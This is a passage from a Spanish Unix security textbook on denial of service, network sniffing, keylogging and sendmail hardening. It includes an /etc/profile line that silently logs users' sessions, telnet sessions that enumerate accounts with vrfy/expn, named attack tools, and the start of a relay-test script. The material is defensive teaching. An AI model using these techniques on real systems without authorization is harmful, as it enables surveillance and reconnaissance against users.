</literallayout>
<!--l. 349--><para>Como podemos ver, este script comprueba si un determinado programa est&#x00E1; lanzado en la m&#x00E1;quina, y si no lo
est&#x00E1; lo lanza &#x00E9;l; algo completamente inofensivo a primera vista, y plani&#xFB01;cado habitualmente en muchos
sistemas para que se ejecute &#x2013; por ejemplo, cada cinco minutos &#x2013; desde crond. Sin embargo, nos podemos
parar a pensar qu&#x00E9; suceder&#x02CA;&#x0131;a bajo algunas circunstancias anormales: &#x00BF;y si en el arranque de la m&#x00E1;quina, por
el motivo que sea, no se ha montado correctamente el directorio /proc/? Si esto sucede, la orden &#x2018;ps&#x2019;
generar&#x00E1; un error, la condici&#x00F3;n se cumplir&#x00E1; siempre, y cada cinco minutos se lanzar&#x00E1; una copia de calcula; si
este programa consume mucha CPU, al poco tiempo tendremos un elevado n&#x00FA;mero de copias que
cargar&#x00E1;n enormemente el sistema hasta hacerlo inutilizable. Un ejemplo perfecto de negaci&#x00F3;n de
servicio.
<!--br/-->
<!--br/-->Por fortuna, como ya hemos visto en cap&#x02CA;&#x0131;tulos anteriores, todos los sistemas Unix ofrecen mecanismos
para evitar que un usuario normal pueda tirar abajo una m&#x00E1;quina de esta forma; incluso si no los
ofrecieran, en la mayor parte de los casos el responsable podr&#x02CA;&#x0131;a ser disciplinado fuera del sistema
operativo, por otros medios, como dijo Dennis Ritchie. El problema real no es que usuarios leg&#x02CA;&#x0131;timos
de un entorno causen, intencionada o inintencionadamente, negaciones de servicio: el mayor
problema es que esas negaciones sean causadas de forma remota por piratas ajenos por completo
a nuestra organizaci&#x00F3;n, capaces de tumbar un servidor de millones de pesetas con sencillos
programas, sin dejar ning&#x00FA;n rastro y lo peor, sin ser muchas veces conscientes del da~no que est&#x00E1;n
haciendo.
<!--br/-->
<!--br/-->Estos ataques remotos de negaci&#x00F3;n de servicio son considerados negativos incluso por muchos de los propios
piratas &#x2013; especialmente los m&#x00E1;s experimentados &#x2013;, ya que realmente no suelen demostrar nada positivo de
quien los lanza (si es que alg&#x00FA;n ataque demuestra algo positivo de alguien, lo cual ser&#x02CA;&#x0131;a muy discutible&#x2026;):
generalmente se trata de un script&#x2013;kiddie ejecutando un programa que ni ha hecho, ni entiende, ni ser&#x00E1;
capaz de entender. En la mayor parte de los casos la negaci&#x00F3;n de servicio tiene &#x00E9;xito porque el objetivo
utiliza versiones no actualizadas de demonios (si se para un servicio concreto) o del propio
n&#x00FA;cleo del sistema operativo, si se detiene o degrada por completo la m&#x00E1;quina. Para evitar esto,
la norma a seguir es evidente: mantener siempre actualizados nuestros sistemas, tanto en lo
referente al nivel de parcheado o versiones del n&#x00FA;cleo, como en lo referente a programas cr&#x02CA;&#x0131;ticos
encargados de ofrecer un determinado servicio (demonios, por norma general: sendmail, httpd,
pop3d&#x2026;).
<!--br/-->
<!--br/-->De un tiempo a esta parte &#x2013; en concreto, desde 1999 &#x2013; se ha popularizado mucho el t&#x00E9;rmino &#x2018;negaci&#x00F3;n de
servicio distribuida&#x2019; (Distributed Denial of Service, DDoS): en este ataque un pirata compromete en
primer lugar un determinado n&#x00FA;mero de m&#x00E1;quinas y, en un determinado momento, hace que todas ellas
ataquen masiva y simultaneamente al objetivo u objetivos reales envi&#x00E1;ndoles diferentes tipos de
paquetes; por muy grandes que sean los recursos de la v&#x02CA;&#x0131;ctima, el gran n&#x00FA;mero de tramas que
reciben har&#x00E1; que tarde o temprano dichos recursos sean incapaces de ofrecer un servicio, con
lo que el ataque habr&#x00E1; sido exitoso. Si en lugar de cientos o miles de equipos atacando a la
vez lo hiciera uno s&#x00F3;lo las posibilidades de &#x00E9;xito ser&#x02CA;&#x0131;an casi inexistentes, pero es justamente el
elevado n&#x00FA;mero de &#x2018;peque~nos&#x2019; atacantes lo que hace muy dif&#x02CA;&#x0131;cil evitar este tipo de negaciones de
servicio.
<!--br/-->
<!--br/-->Seg&#x00FA;n el CERT (<citation>[?]</citation>) los ataques de negaci&#x00F3;n de servicio distribuidos m&#x00E1;s habituales consisten en el env&#x02CA;&#x0131;o de
un gran n&#x00FA;mero de paquetes a un determinado objetivo por parte de m&#x00FA;ltiples hosts, lo que se conoce como

packet &#xFB02;ooding (en funci&#x00F3;n del tipo de paquetes utilizados se habla de ping &#xFB02;ood, de SYN &#xFB02;ood&#x2026;). Defenderse
de este tipo de ataques es dif&#x02CA;&#x0131;cil: en primer lugar, uno piensa en bloquear de alguna forma (probablemente
en un cortafuegos o en un router) todo el tr&#x00E1;&#xFB01;co proveniente de los atacantes; pero &#x00BF;qu&#x00E9; sucede
cuando tenemos miles de ordenadores atacando desde un gran n&#x00FA;mero de redes diferentes?
&#x00BF;Los bloqueamos uno a uno? Esto supondr&#x02CA;&#x0131;a un gran esfuerzo que dif&#x02CA;&#x0131;cilmente ayudar&#x02CA;&#x0131;a, ya
que lo m&#x00E1;s probable es que en el tiempo que nos cueste bloquear el tr&#x00E1;&#xFB01;co de una determinada
m&#x00E1;quina, dos o tres nuevas nos comiencen a atacar. Entonces, &#x00BF;bloqueamos todo el tr&#x00E1;&#xFB01;co dirigido
hacia el objetivo? Si hacemos esto, estamos justamente ayudando al atacante, ya que somos
nosotros mismos los que causamos una negaci&#x00F3;n en el servicio a los usuarios leg&#x02CA;&#x0131;timos de nuestro
sistema&#x2026;
<!--br/-->
<!--br/-->Como vemos, la defensa ante una negaci&#x00F3;n de servicio distribuida no es inmediata; en cualquier caso,
podemos tomar ciertas medidas preventivas que nos ayudar&#x00E1;n a limitar el alcance de uno de estos ataques
(y en general de las negaciones de servicio remotas, distribuidas o no). De entrada, un correcto &#xFB01;ltrado del
tr&#x00E1;&#xFB01;co dirigido a nuestras m&#x00E1;quinas es vital para garantizar nuestra seguridad: no hay que responder a
pings externos a nuestra red, es necesario activar el antispoo&#xFB01;ng en nuestros cortafuegos y en
los elementos de electr&#x00F3;nica de red que lo permitan, etc. Establecer correctamente l&#x02CA;&#x0131;mites a
la utilizaci&#x00F3;n de nuestros recursos, como ya hemos visto, es tambi&#x00E9;n una importante medida
preventiva; es posible limitar el ancho de banda dedicado a una determinada aplicaci&#x00F3;n o a un
protocolo, de forma que las utilizaciones por encima del margen son negadas. Tambi&#x00E9;n podemos
limitar los recursos del sistema (CPU, memoria, disco&#x2026;) que puede consumir en global una
determinada aplicaci&#x00F3;n servidora (por ejemplo, un demonio sirviendo p&#x00E1;ginas web), adem&#x00E1;s de
restringir sus recursos por cliente simult&#x00E1;neo (en base, por ejemplo, a la direcci&#x00F3;n origen de ese
cliente).
<!--br/-->
<!--br/-->A pesar de las di&#xFB01;cultades con las que nos podemos encontrar a la hora de prevenir ataques
de negaci&#x00F3;n de servicio, una serie de medidas sencillas pueden ayudarnos de forma relativa
en esa tarea; las negaciones de servicio son por desgracia cada d&#x02CA;&#x0131;a m&#x00E1;s frecuentes, y ninguna
organizaci&#x00F3;n est&#x00E1; a salvo de las mismas. Especialmente en los ataques distribuidos, la seguridad de
cualquier usuario conectado a Internet (aunque sea con un sencillo PC y un m&#x00F3;dem) es un eslab&#x00F3;n
importante en la seguridad global de la red, ya que esos usuarios se convierten muchas veces sin
saberlo en sat&#x00E9;lites que colaboran en un ataque masivo contra organizaciones de cualquier
tipo. Cuanto m&#x00E1;s dif&#x02CA;&#x0131;cil se lo pongamos cada uno de nosotros a los piratas, mucho mejor para
todos.
  </para></section><!--end section--><!--l. 444--><section 
role="section"><title><abbrev role="title-mark">17.4</abbrev><anchor 
   id="x1-27600017.4"  ></anchor>Interceptaci&#x00F3;n</title>
<!--l. 445--><para>  En la secci&#x00F3;n  <ulink 
  url="#x1-370002.3.1"  ><!--ref: eavesdropping--></ulink> ya comentamos algunos aspectos relacionados con la interceptaci&#x00F3;n de datos en tr&#x00E1;nsito o en
proceso por parte de usuarios no autorizados; all&#x02CA;&#x0131; hablamos de los ataques y defensas desde un punto de
vista casi exclusivamente f&#x02CA;&#x0131;sico, por lo que vamos a entrar ahora en algunos puntos m&#x00E1;s relacionados con la
interceptaci&#x00F3;n l&#x00F3;gica. Y sin duda, la interceptaci&#x00F3;n l&#x00F3;gica de datos m&#x00E1;s conocida y extendida es el sni&#xFB03;ng:
en esa misma secci&#x00F3;n ya introdujimos este t&#x00E9;rmino y hablamos de dispositivos hardware como
los sni&#xFB00;ers de alta impedancia; sin embargo, en entornos de trabajo de seguridad media es
mucho m&#x00E1;s com&#x00FA;n que el sni&#xFB03;ng se produzca utilizando programas (sni&#xFB00;ers) y no elementos
hardware.
<!--br/-->
<!--br/-->En las redes de difusi&#x00F3;n, cuando una m&#x00E1;quina env&#x02CA;&#x0131;a una trama a otra indica en un campo reservado la direcci&#x00F3;n del
host destino <anchor 
   id="x1-276001f3"  ></anchor><footnote><para>     No vamos a entrar en detalles sobre el funcionamiento de TCP/IP ni sobre qu&#x00E9; direcci&#x00F3;n se env&#x02CA;&#x0131;a: a nosotros s&#x00F3;lo nos interesa
saber que en el paquete se identi&#xFB01;ca de alguna forma al destino.</para></footnote>;
todas las m&#x00E1;quinas del dominio de colisi&#x00F3;n ven esa trama, pero s&#x00F3;lo su receptora leg&#x02CA;&#x0131;tima la captura y elimina
de la red. Este es el funcionamiento normal de TCP/IP; sin embargo, es necesario insistir en un aspecto:
todas las m&#x00E1;quinas ven la trama, y si no leen todos sus campos es porque no &#x2018;quieren&#x2019;. Existe un modo de
funcionamiento de las interfaces de red denominado modo promiscuo, en el cual la tarjeta lee todas las
tramas que circulan por la red, tanto dirigidas a ella como a otras m&#x00E1;quinas; el leerlas no implica el
eliminarlas de la red, por lo que el host destino leg&#x02CA;&#x0131;timo la recibir&#x00E1; y eliminar&#x00E1; sin notar nada
extra~no.
<!--br/-->

<!--br/-->Para hacer funcionar un interfaz de red en modo promiscuo es necesario tener un control total del sistema
o, dicho de otra forma, ser root en la m&#x00E1;quina; esto ayuda un poco en la defensa, pero ni de lejos soluciona
el problema que estamos planteado: no podemos permitir que cualquiera que sea superusuario de un
sistema pueda capturar todo el tr&#x00E1;&#xFB01;co que pasa por el mismo (incluyendo claves, correo electr&#x00F3;nico, y cientos
de datos privados). Por si esto fuera poco, en los sistemas donde todos los usuarios tienen un control total
de la m&#x00E1;quina (por ejemplo, en toda la familia Windows 9x) ni siquiera hace falta ese privilegio:
cualquiera que se siente en un PC puede ejecutar un sni&#xFB00;er y capturar todo el tr&#x00E1;&#xFB01;co de la
red.
<!--br/-->
<!--br/-->Programas para &#x2018;esnifar&#x2019; tr&#x00E1;&#xFB01;co hay para todos los gustos y colores: desde dsniff y su familia, capaces
hasta de capturar los correos electr&#x00F3;nicos directamente en formato SMTP o cargar de forma autom&#x00E1;tica en un
navegador las mismas p&#x00E1;ginas que visita la v&#x02CA;&#x0131;ctima del ataque, hasta el arcaico snoop de Solaris, que vuelca
paquetes en un formato por defecto casi ilegible, pasando por los cl&#x00E1;sicos tcpdump o sniffit (que en
algunas de sus versiones inclu&#x02CA;&#x0131;a el Touch of Dead, capaz de cortar conexiones establecidas entre dos
m&#x00E1;quinas sin m&#x00E1;s que pulsar F5). Para evitar que programas de este tipo capturen nuestra informaci&#x00F3;n
existen diferentes aproximaciones m&#x00E1;s o menos efectivas, como sustituir los HUBs de nuestra red por
switches que aislan dominios de colisi&#x00F3;n (&#x00A1;ojo, esto di&#xFB01;culta el ataque pero no lo imposibilita!) o implantar
redes privadas virtuales. Pero sin ninguna duda la m&#x00E1;s barata y sencilla es el uso de protocolos
cifrados siempre que nos sea posible (que lo suele ser casi siempre); repetimos una vez m&#x00E1;s lo
que hemos dicho ya en muchas ocasiones: sustituir telnet y rlogin por SSH y FTP por scp
o sftp es muy sencillo, y nos proporciona un incremento de seguridad abismal en nuestro
entorno. Implantar SSL o t&#x00FA;neles seguros quiz&#x00E1;s es algo m&#x00E1;s costoso &#x2013; en tiempo solamente &#x2013;,
pero tambi&#x00E9;n en la mayor&#x02CA;&#x0131;a de ocasiones es algo que vale la pena hacer: en todo momento
hemos de tener presente que el sni&#xFB03;ng es un peligro real, que no necesita de grandes medios
y, lo que es peor, indetectable en la mayor parte de casos; a pesar de que existen m&#x00E9;todos
para tratar de detectar sistemas con un interfaz en modo promiscuo, no suelen ser todo lo
efectivos que uno podr&#x02CA;&#x0131;a esperar, ya que detectar una m&#x00E1;quina en este estado no es ni de lejos
inmediato.
<!--br/-->
<!--br/-->Como hemos dicho, el sni&#xFB03;ng es el ataque de interceptaci&#x00F3;n m&#x00E1;s conocido y utilizado, pero no es el &#x00FA;nico que
se puede poner en pr&#x00E1;ctica contra un sistema determinado, Unix o no. En algunas versiones de Linux
existe un programa denominado ttysnoop (por snooping &#x2013; &#xFB01;sgoneo &#x2013; se conoce a los ataques
gen&#x00E9;ricos de interceptaci&#x00F3;n de datos) capaz de registrar en tiempo real todo lo que un usuario
teclea en una terminal, tanto f&#x02CA;&#x0131;sica como virtual. Aunque el resultado es en muchos aspectos
similar al sni&#xFB03;ng, t&#x00E9;cnicamente poco tiene que ver con este: en ning&#x00FA;n momento se capturan
datos que circulan por la red, la tarjeta no trabaja en modo promiscuo (es mas, ni siquiera
es necesario un interfaz de red), etc; simplemente, la informaci&#x00F3;n que un usuario introduce
en una terminal es clonada en otra, permitiendo tanto la entrada como la salida de datos
a trav&#x00E9;s de ambas. Aunque Linux sea el sistema Unix nativo de ttysnoop existen versiones
tambi&#x00E9;n para otros entornos, y por supuesto esta no es la &#x00FA;nica herramienta para &#x2018;&#xFB01;sgonear&#x2019; en
las terminales de usuarios (otro ejemplo podr&#x02CA;&#x0131;a ser TTY Watcher, disponible para SunOS y
Solaris).
<!--br/-->
<!--br/-->Otro ataque de interceptaci&#x00F3;n, menos utilizado que los anteriores pero igual de peligroso, es el keylogging, el
registro de las teclas pulsadas por un usuario en una sesi&#x00F3;n. Aunque es m&#x00E1;s habitual el uso de keyloggers en
entornos Windows, en Unix tambi&#x00E9;n disponemos de ellos: podr&#x02CA;&#x0131;amos incluso considerar a ttysnoop como
un keylogger avanzado, que no se limita &#x00FA;nicamente a registrar lo tecleado sino que permite interacci&#x00F3;n en
tiempo real; otro ejemplo de un programa que capture esta informaci&#x00F3;n puede ser una mula de troya cl&#x00E1;sica,
de las que ya hemos hablado. Incluso en cualquier Unix viene de serie un keylogger: el programa script,
que guarda en un archivo lo que el usuario que lo invoca lee o escribe en la pantalla; bastar&#x02CA;&#x0131;a una
llamada a este programa en el inicio de sesi&#x00F3;n de cada usuario para conseguir un registro &#x2013; muy
arcaico y f&#x00E1;cilmente falseable &#x2013; de lo que cada usuario teclea en su terminal, algo parecido a lo
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;grep&#x00A0;script&#x00A0;/etc/profile
&#x00A0;exec&#x00A0;/usr/bin/script&#x00A0;-a&#x00A0;/tmp/comandos-$USER
&#x00A0;luisa:~#
</literallayout>
<!--l. 543--><para>Podemos ver que al invocar a script especi&#xFB01;camos el archivo donde deseamos que se replique la informaci&#x00F3;n;
si en lugar de un &#xFB01;chero plano indicamos una terminal, tenemos un clonador de sesiones perfecto, aunque
no interactivo.
<!--br/-->
<!--br/-->Para &#xFB01;nalizar este punto podemos re&#xFB02;exionar brevemente sobre la peligrosidad de los ataques de
interceptaci&#x00F3;n; muchos de ellos necesitan privilegios de superusuario en al menos una m&#x00E1;quina, pero por lo
dem&#x00E1;s son realmente sencillos. Sencillos y peligrosos: aunque se trate de ataques pasivos, y aunque alguien
pueda pensar que si el pirata ya es root no se puede atacar m&#x00E1;s al sistema, permiten capturar datos
relativos no s&#x00F3;lo al sistema comprometido, sino a otras m&#x00E1;quinas que quiz&#x00E1;s a&#x00FA;n no han sido atacadas y que
posiblemente representan el objetivo real del pirata. Evitar estos ataques pasa en primera instancia por no
permitir que un pirata consiga privilegios en un sistema &#x2013; mejor si no consigue nada, pero
esto no siempre es posible &#x2013;, y en segunda por lo que ya sabemos: cifrar cuanto m&#x00E1;s tr&#x00E1;&#xFB01;co
mejor.
  </para></section><!--end section--><!--l. 558--><section 
role="section"><title><abbrev role="title-mark">17.5</abbrev><anchor 
   id="x1-27700017.5"  ></anchor>Ataques a aplicaciones</title>
<!--l. 559--><para>
  </para><!--l. 559--><section 
role="subsection"><title><abbrev role="title-mark">17.5.1</abbrev><anchor 
   id="x1-27800017.5.1"  ></anchor>Correo electr&#x00F3;nico</title>
<!--l. 560--><para>  Desde hace muchos a~nos los sistemas de correo electr&#x00F3;nico de una organizaci&#x00F3;n han sido para
los piratas una fuente inagotable de puntos de entrada a la misma; lo m&#x00E1;s probable es que
si le preguntamos a cualquier administrador de m&#x00E1;quinas Unix con algo de experiencia cu&#x00E1;l
ha sido el software que m&#x00E1;s problemas de seguridad le ha causado nos responda sin dudarlo:
sendmail, por supuesto. Y ya no s&#x00F3;lo sendmail y el protocolo SMTP, sino que tambi&#x00E9;n, con
la popularizaci&#x00F3;n de POP3, los servidores de este protocolo son un peligro potencial a tener
en cuenta en cualquier entorno inform&#x00E1;tico donde se utilice el correo electr&#x00F3;nico: es decir, en
todos.
<!--br/-->
<!--br/-->De entrada, un programa como sendmail &#x2013; lo ponemos como ejemplo por ser el m&#x00E1;s popular, pero
podr&#x02CA;&#x0131;amos hablar en los mismos t&#x00E9;rminos de casi cualquier servidor SMTP &#x2013; proporciona demasiada
informaci&#x00F3;n a un atacante que simplemente conecte a &#x00E9;l:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~$&#x00A0;telnet&#x00A0;0&#x00A0;25
&#x00A0;Trying&#x00A0;0.0.0.0...
&#x00A0;Connected&#x00A0;to&#x00A0;0.
&#x00A0;Escape&#x00A0;character&#x00A0;is&#x00A0;&#x2019;&#x02C6;]&#x2019;.
&#x00A0;220&#x00A0;luisa&#x00A0;ESMTP&#x00A0;Sendmail&#x00A0;8.9.3/8.9.3;&#x00A0;Mon,&#x00A0;29&#x00A0;Oct&#x00A0;2001&#x00A0;03:58:56&#x00A0;+0200
&#x00A0;quit
&#x00A0;221&#x00A0;luisa&#x00A0;closing&#x00A0;connection
&#x00A0;Connection&#x00A0;closed&#x00A0;by&#x00A0;foreign&#x00A0;host.
&#x00A0;luisa:~$
</literallayout>
<!--l. 587--><para>Y no s&#x00F3;lo se proporcionan datos &#x00FA;tiles para un pirata como la versi&#x00F3;n del programa utilizada o la fecha
del sistema, sino que se llega incluso m&#x00E1;s lejos: tal y como se instalan por defecto, muchos
servidores SMTP (aparte de sendmail, algunos tan populares como Netscape Messaging Server)
informan incluso de la existencia o inexistencia de nombres de usuario y de datos sobre los
mismos:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~$&#x00A0;telnet&#x00A0;0&#x00A0;25
&#x00A0;Trying&#x00A0;0.0.0.0...
&#x00A0;Connected&#x00A0;to&#x00A0;0.
&#x00A0;Escape&#x00A0;character&#x00A0;is&#x00A0;&#x2019;&#x02C6;]&#x2019;.
&#x00A0;220&#x00A0;luisa&#x00A0;ESMTP&#x00A0;Sendmail&#x00A0;8.9.3/8.9.3;&#x00A0;Mon,&#x00A0;29&#x00A0;Oct&#x00A0;2001&#x00A0;04:03:22&#x00A0;+0200
&#x00A0;vrfy&#x00A0;root
&#x00A0;250&#x00A0;El&#x00A0;Spiritu&#x00A0;Santo&#x00A0;&#x003C;root@luisa&#x003E;
&#x00A0;expn&#x00A0;root
&#x00A0;250&#x00A0;El&#x00A0;Spiritu&#x00A0;Santo&#x00A0;&#x003C;root@luisa&#x003E;
&#x00A0;quit
&#x00A0;221&#x00A0;luisa&#x00A0;closing&#x00A0;connection
&#x00A0;Connection&#x00A0;closed&#x00A0;by&#x00A0;foreign&#x00A0;host.
&#x00A0;luisa:~$
</literallayout>
<!--l. 610--><para>Parece evidente que de entrada estamos d&#x00E1;ndole a cualquier pirata demasiada informaci&#x00F3;n sobre nuestro
entorno de trabajo; una de las primeras cosas que deber&#x02CA;&#x0131;amos hacer en todos nuestros servidores de correo
es deshabilitar este tipo de opciones. En concreto, para deshabilitar las &#x00F3;rdenes vrfy y expn, en
sendmail.cf debemos modi&#xFB01;car la l&#x02CA;&#x0131;nea

     </para><literallayout role="verbatim">
&#x00A0;O&#x00A0;PrivacyOptions=authwarnings
</literallayout>
<!--l. 621--><para>para que no se proporcione informaci&#x00F3;n, de la forma siguiente:

     </para><literallayout role="verbatim">
&#x00A0;O&#x00A0;PrivacyOptions=goaway
</literallayout>
<!--l. 627--><para>Para conseguir que que sendmail adem&#x00E1;s tampoco informe de su versi&#x00F3;n y la fecha del sistema &#x2013; algo
recomendable, evidentemente &#x2013; la entrada a modi&#xFB01;car es SmtpGreetingMessage. Si lo hacemos, y adem&#x00E1;s
hemos deshabilitado las PrivacyOptions, cuando alguien conecte a nuestro servidor ver&#x00E1; algo similar
a:

     </para><literallayout role="verbatim">
&#x00A0;luisa:/#&#x00A0;egrep&#x00A0;&#x0022;Privacy|Greeting&#x0022;&#x00A0;/etc/sendmail.cf
&#x00A0;O&#x00A0;PrivacyOptions=goaway
&#x00A0;O&#x00A0;SmtpGreetingMessage=Servidor
&#x00A0;luisa:/#&#x00A0;telnet&#x00A0;0&#x00A0;25
&#x00A0;Trying&#x00A0;0.0.0.0...
&#x00A0;Connected&#x00A0;to&#x00A0;0.
&#x00A0;Escape&#x00A0;character&#x00A0;is&#x00A0;&#x2019;&#x02C6;]&#x2019;.
&#x00A0;220&#x00A0;Servidor&#x00A0;ESMTP
&#x00A0;vrfy&#x00A0;root
&#x00A0;252&#x00A0;Cannot&#x00A0;VRFY&#x00A0;user;&#x00A0;try&#x00A0;RCPT&#x00A0;to&#x00A0;attempt&#x00A0;delivery&#x00A0;(or&#x00A0;try&#x00A0;finger)
&#x00A0;quit
&#x00A0;221&#x00A0;luisa&#x00A0;closing&#x00A0;connection
&#x00A0;Connection&#x00A0;closed&#x00A0;by&#x00A0;foreign&#x00A0;host.
&#x00A0;luisa:/#
</literallayout>
<!--l. 650--><para>En realidad, si un atacante quiere conocer la versi&#x00F3;n del servidor que estamos utilizando a&#x00FA;n no lo tiene dif&#x02CA;&#x0131;cil,
ya que simplemente ha de teclear una orden como &#x2018;help&#x2019;:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~$&#x00A0;telnet&#x00A0;0&#x00A0;25
&#x00A0;Trying&#x00A0;0.0.0.0...
&#x00A0;Connected&#x00A0;to&#x00A0;0.
&#x00A0;Escape&#x00A0;character&#x00A0;is&#x00A0;&#x2019;&#x02C6;]&#x2019;.
&#x00A0;220&#x00A0;Servidor&#x00A0;ESMTP
&#x00A0;help
&#x00A0;214-This&#x00A0;is&#x00A0;Sendmail&#x00A0;version&#x00A0;8.9.3
&#x00A0;214-Topics:
&#x00A0;214-&#x00A0;&#x00A0;&#x00A0;&#x00A0;HELO&#x00A0;&#x00A0;&#x00A0;&#x00A0;EHLO&#x00A0;&#x00A0;&#x00A0;&#x00A0;MAIL&#x00A0;&#x00A0;&#x00A0;&#x00A0;RCPT&#x00A0;&#x00A0;&#x00A0;&#x00A0;DATA
&#x00A0;214-&#x00A0;&#x00A0;&#x00A0;&#x00A0;RSET&#x00A0;&#x00A0;&#x00A0;&#x00A0;NOOP&#x00A0;&#x00A0;&#x00A0;&#x00A0;QUIT&#x00A0;&#x00A0;&#x00A0;&#x00A0;HELP&#x00A0;&#x00A0;&#x00A0;&#x00A0;VRFY
&#x00A0;214-&#x00A0;&#x00A0;&#x00A0;&#x00A0;EXPN&#x00A0;&#x00A0;&#x00A0;&#x00A0;VERB&#x00A0;&#x00A0;&#x00A0;&#x00A0;ETRN&#x00A0;&#x00A0;&#x00A0;&#x00A0;DSN
&#x00A0;214-For&#x00A0;more&#x00A0;info&#x00A0;use&#x00A0;&#x0022;HELP&#x00A0;&#x003C;topic&#x003E;&#x0022;.
&#x00A0;214-To&#x00A0;report&#x00A0;bugs&#x00A0;in&#x00A0;the&#x00A0;implementation&#x00A0;send&#x00A0;email&#x00A0;to
&#x00A0;214-&#x00A0;&#x00A0;&#x00A0;&#x00A0;sendmail-bugs@sendmail.org.
&#x00A0;214-For&#x00A0;local&#x00A0;information&#x00A0;send&#x00A0;email&#x00A0;to&#x00A0;Postmaster&#x00A0;at&#x00A0;your&#x00A0;site.
&#x00A0;214&#x00A0;End&#x00A0;of&#x00A0;HELP&#x00A0;info
&#x00A0;quit
&#x00A0;221&#x00A0;luisa&#x00A0;closing&#x00A0;connection
&#x00A0;Connection&#x00A0;closed&#x00A0;by&#x00A0;foreign&#x00A0;host.
&#x00A0;luisa:~$
</literallayout>
<!--l. 677--><para>Para evitar esto debemos modi&#xFB01;car convenientemente el &#xFB01;chero sendmail.hf (en funci&#x00F3;n del Unix utilizado
su ubicaci&#x00F3;n en la estructura de directorios cambiar&#x00E1;) de forma que se restrinjan m&#x00E1;s los mensajes que
proporciona el demonio en una sesi&#x00F3;n interactiva; para obtener informaci&#x00F3;n sobre este &#xFB01;chero,
as&#x02CA;&#x0131; como del resto de con&#xFB01;guraciones de sendmail podemos consultar <citation>[?]</citation>. Debemos tener
presente que conocer ciertos datos que el programa proporciona puede facilitarle mucho la
tarea a un pirata; ocultar esta informaci&#x00F3;n no es ni mucho menos una garant&#x02CA;&#x0131;a de seguridad,
ni por supuesto ha de suponer uno de los pilares de nuestra pol&#x02CA;&#x0131;tica, pero si con un par de
peque~nas modi&#xFB01;caciones conseguimos quitarnos de encima aunque s&#x00F3;lo sea a un atacante casual,
bienvenidas sean &#x2013; aunque muchos consideren esto una apolog&#x02CA;&#x0131;a del security through obscurity
&#x2013;.
<!--br/-->
<!--br/-->Independientemente del programa que utilicemos como servidor de correo y su versi&#x00F3;n concreta, con
vulnerabilidades conocidas o no, otro gran problema de los sistemas de correo SMTP es el relay: la
posibilidad de que un atacante interno utilice nuestros servidores para enviar correo electr&#x00F3;nico a terceros,
no relacionados con nuestra organizaci&#x00F3;n. Aunque en principio esto a muchos les pueda parecer un mal
menor, no lo es; de entrada, si nuestros servidores permiten el relay estamos favoreciendo el SPAM en la
red, el env&#x02CA;&#x0131;o de e-mail no deseado con &#xFB01;nes casi siempre publicitarios, algo que evidentemente a nadie le
hace gracia recibir. Adem&#x00E1;s, el relay causa una negaci&#x00F3;n de servicio contra nuestros usuarios leg&#x02CA;&#x0131;timos, tanto
desde un punto de vista estrictamente te&#x00F3;rico &#x2013; alguien consume nuestros recursos de forma no
autorizada, degradando as&#x02CA;&#x0131; el servicio ofrecido a nuestros usuarios leg&#x02CA;&#x0131;timos &#x2013; como en la
pr&#x00E1;ctica: cuando un robot encuentra un servidor SMTP en el que se permite el relay lo utiliza
masivamente mientras puede, cargando enormemente la m&#x00E1;quina y entorpeciendo el funcionamiento
normal de nuestros sistemas. Por si esto fuera poco, si se incluye a nuestra organizaci&#x00F3;n en
alguna &#x2018;lista negra&#x2019; de servidores que facilitan el SPAM se causa un importante da~no a nuestra
imagen, e incluso ciertos dominios pueden llegar a negar todo el correo proveniente de nuestros
servidores.
<!--br/-->
<!--br/-->S&#x00F3;lo existe una manera de evitar el relay: con&#xFB01;gurando correctamente todos nuestros servidores de correo.
Por supuesto, esto es completamente dependiente de los programas (sendmail, iPlanet&#x2026;) utilizados en
nuestro entorno, por lo que es necesario consultar en la documentaci&#x00F3;n correspondiente la forma de
habilitar &#xFB01;ltros que eviten el relay; por Internet exiten incluso &#xFB01;ltros gen&#x00E9;ricos para los servidores m&#x00E1;s
extendidos, por lo que nuestro trabajo no ser&#x00E1; excesivo ni complicado. Si queremos veri&#xFB01;car que nuestros

servidores no permiten el relay podemos ejecutar, desde una direcci&#x00F3;n externa a nuestra organizaci&#x00F3;n, el
siguiente programa:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~$&#x00A0;cat&#x00A0;security/prog/testrelay.sh
&#x00A0;#!/bin/sh
&#x00A0;#&#x00A0;Este&#x00A0;script&#x00A0;comprueba&#x00A0;que&#x00A0;un&#x00A0;servidor&#x00A0;de&#x00A0;correo&#x00A0;no&#x00A0;permite&#x00A0;el&#x00A0;relay.
&#x00A0;#&#x00A0;Basado&#x00A0;en&#x00A0;los&#x00A0;test&#x00A0;disponibles&#x00A0;en
&#x00A0;#&#x00A0;http://133.30.50.200/~takawata/d/resource/relaytest.html
&#x00A0;#&#x00A0;Necesitamos&#x00A0;netcat&#x00A0;(nc)&#x00A0;instalado&#x00A0;en&#x00A0;el&#x00A0;sistema.
&#x00A0;#&#x00A0;Toni&#x00A0;Villalon&#x00A0;&#x003C;toni@aiind.upv.es&#x003E;,&#x00A0;03&#x00A0;Enero&#x00A0;2000
&#x00A0;#&#x00A0;NOTA:&#x00A0;Es&#x00A0;necesario&#x00A0;personalizar&#x00A0;la&#x00A0;variable&#x00A0;DSTADDR
&#x00A0;#
&#x00A0;
&#x00A0;#&#x00A0;Argumentos&#x00A0;erroneos?
&#x00A0;if&#x00A0;(test&#x00A0;$#&#x00A0;-lt&#x00A0;1);&#x00A0;then
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;echo&#x00A0;&#x0022;Uso:&#x00A0;$0&#x00A0;mail.dominio.com&#x0022;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;exit
&#x00A0;fi
&#x00A0;#&#x00A0;Especificamos&#x00A0;una&#x00A0;direccion&#x00A0;origen&#x00A0;(no&#x00A0;es&#x00A0;necesario&#x00A0;que&#x00A0;sea&#x00A0;real)
&#x00A0;SRCADDR=prova@prova.com
&#x00A0;SRCUSR=&#x2018;echo&#x00A0;$SRCADDR|awk&#x00A0;-F@&#x00A0;&#x2019;{print&#x00A0;$1}&#x2019;&#x2018;
